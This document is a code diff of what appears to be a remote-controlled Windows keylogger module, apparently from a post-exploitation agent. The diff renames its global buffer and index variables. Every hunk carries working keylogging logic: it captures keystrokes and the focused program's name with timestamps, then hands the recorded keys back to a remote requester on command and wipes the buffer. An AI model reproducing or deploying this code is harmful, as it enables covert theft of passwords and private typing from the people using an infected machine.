@@ -58,10 +58,10 @@ f_QueryFullProcessImageNameW fnQueryFullProcessImageNameW;
 const char g_szClassName[] = "klwClass";
 HANDLE tKeyScan = NULL;
 const unsigned int KEYBUFSIZE = 1024 * 1024;
-WCHAR *keyscan_buf = NULL;
-size_t idx = 0;
-WCHAR active_image[MAX_PATH] = L"Logging started";
-WCHAR prev_active_image[MAX_PATH] = { 0 };
+WCHAR *g_keyscan_buf = NULL;
+size_t g_idx = 0;
+WCHAR g_active_image[MAX_PATH] = L"Logging started";
+WCHAR g_prev_active_image[MAX_PATH] = { 0 };
 DWORD dwThreadId;
 
 /*
@@ -117,13 +117,13 @@ int WINAPI ui_keyscan_proc()
 		return 0;
 	}
 
-	// initialize keyscan_buf
-	if (keyscan_buf) {
-		free(keyscan_buf);
-		keyscan_buf = NULL;
+	// initialize g_keyscan_buf
+	if (g_keyscan_buf) {
+		free(g_keyscan_buf);
+		g_keyscan_buf = NULL;
 	}
 
-	keyscan_buf = calloc(KEYBUFSIZE, sizeof(WCHAR));
+	g_keyscan_buf = calloc(KEYBUFSIZE, sizeof(WCHAR));
 
 	// create message-only window
 	hwnd = CreateWindowEx(
@@ -240,7 +240,7 @@ DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 {
 	Packet *response = packet_create_response(request);
 	DWORD result = ERROR_SUCCESS;
-	idx = 0;
+	g_idx = 0;
 
 	if (tKeyScan) {
 		TerminateThread(tKeyScan, 0);
@@ -266,9 +266,9 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 
 	if (tKeyScan) {
 		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
-		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, (LPCSTR)keyscan_buf);
-		memset(keyscan_buf, 0, KEYBUFSIZE);
-		idx = 0;
+		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, (LPCSTR)g_keyscan_buf);
+		memset(g_keyscan_buf, 0, KEYBUFSIZE);
+		g_idx = 0;
 	}
 	else {
 		result = 1;
@@ -290,14 +290,14 @@ DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
 	char *utf8_keyscan_buf = NULL;
 
 	if (tKeyScan) {
-		utf8_keyscan_buf = wchar_to_utf8(keyscan_buf);
+		utf8_keyscan_buf = wchar_to_utf8(g_keyscan_buf);
 		packet_add_tlv_raw(response, TLV_TYPE_KEYS_DUMP, (LPVOID)utf8_keyscan_buf, strlen(utf8_keyscan_buf) + 1);
-		memset(keyscan_buf, 0, KEYBUFSIZE);
+		memset(g_keyscan_buf, 0, KEYBUFSIZE);
 
 		// reset index and zero active window string so the current one
 		// is logged again
-		idx = 0;
-		RtlZeroMemory(prev_active_image, MAX_PATH);
+		g_idx = 0;
+		RtlZeroMemory(g_prev_active_image, MAX_PATH);
 	}
 	else {
 		result = 1;
@@ -330,11 +330,11 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
 	GetKeyboardState(lpKeyboard);
 
-	// treat keyscan_buf as a circular array
+	// treat g_keyscan_buf as a circular array
 	// boundary could be adjusted
-	if ((idx + 256) >= KEYBUFSIZE)
+	if ((g_idx + 256) >= KEYBUFSIZE)
 	{
-		idx = 0;
+		g_idx = 0;
 	}
 
 	// get focused window pid
@@ -348,17 +348,17 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 
 	if (active_proc) {
 		// if null, we're on pre-vista or something is terribly wrong
-		(fnQueryFullProcessImageNameW) ? fnQueryFullProcessImageNameW(active_proc, 0, (LPTSTR)active_image, &mpsz) : fnGetProcessImageFileNameW(active_proc, (LPTSTR)active_image, mpsz);
+		(fnQueryFullProcessImageNameW) ? fnQueryFullProcessImageNameW(active_proc, 0, (LPTSTR)g_active_image, &mpsz) : fnGetProcessImageFileNameW(active_proc, (LPTSTR)g_active_image, mpsz);
 
 		// new window in focus, notate it
-		if (wcscmp(active_image, prev_active_image) != 0)
+		if (wcscmp(g_active_image, g_prev_active_image) != 0)
 		{
 			GetSystemTime(&st);
 			GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &st, NULL, date_s, sizeof(date_s));
 			GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, NULL, time_s, sizeof(time_s));
-			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"\n>>>\n%s\n@ %s %s UTC\n<<<\n", active_image, date_s, time_s);
-			RtlZeroMemory(prev_active_image, MAX_PATH);
-			_snwprintf(prev_active_image, MAX_PATH, L"%s", active_image);
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n>>>\n%s\n@ %s %s UTC\n<<<\n", g_active_image, date_s, time_s);
+			RtlZeroMemory(g_prev_active_image, MAX_PATH);
+			_snwprintf(g_prev_active_image, MAX_PATH, L"%s", g_active_image);
 		}
 		CloseHandle(active_proc);
 	}
@@ -373,38 +373,38 @@ int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 		// ctrl by itself, not much insight to be gained
 		break;
 	case VK_BACK:
-		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<^H>");
+		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<^H>");
 		break;
 	case VK_RETURN:
-		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<CR>\r\n");
+		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<CR>\r\n");
 		break;
 	case VK_MENU:
 		if (isE0)
-			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<RAlt>");
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<RAlt>");
 		else
-			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<LAlt>");
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<LAlt>");
 		break;
 	case VK_TAB:
-		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<Tab>");
+		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<Tab>");
 		break;
 	case VK_NUMLOCK: // pause/break and numlock both send the same message
 		key = (MapVirtualKey(vKey, MAPVK_VK_TO_VSC) | 0x100);
 		if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
-			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
 		break;
 	default:
 		if (ctrl_is_down)
 		{
 			if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
-				idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<^%ls>", gknt_buf);
+				g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<^%ls>", gknt_buf);
 		}
 		else if (ToUnicodeEx(vKey, mCode, lpKeyboard, kb, 16, 0, NULL) == 1)
 		{
-			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"%ls", kb);
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"%ls", kb);
 		}
 		else if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
 		{
-			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
 		}
 	}
 	return 0;
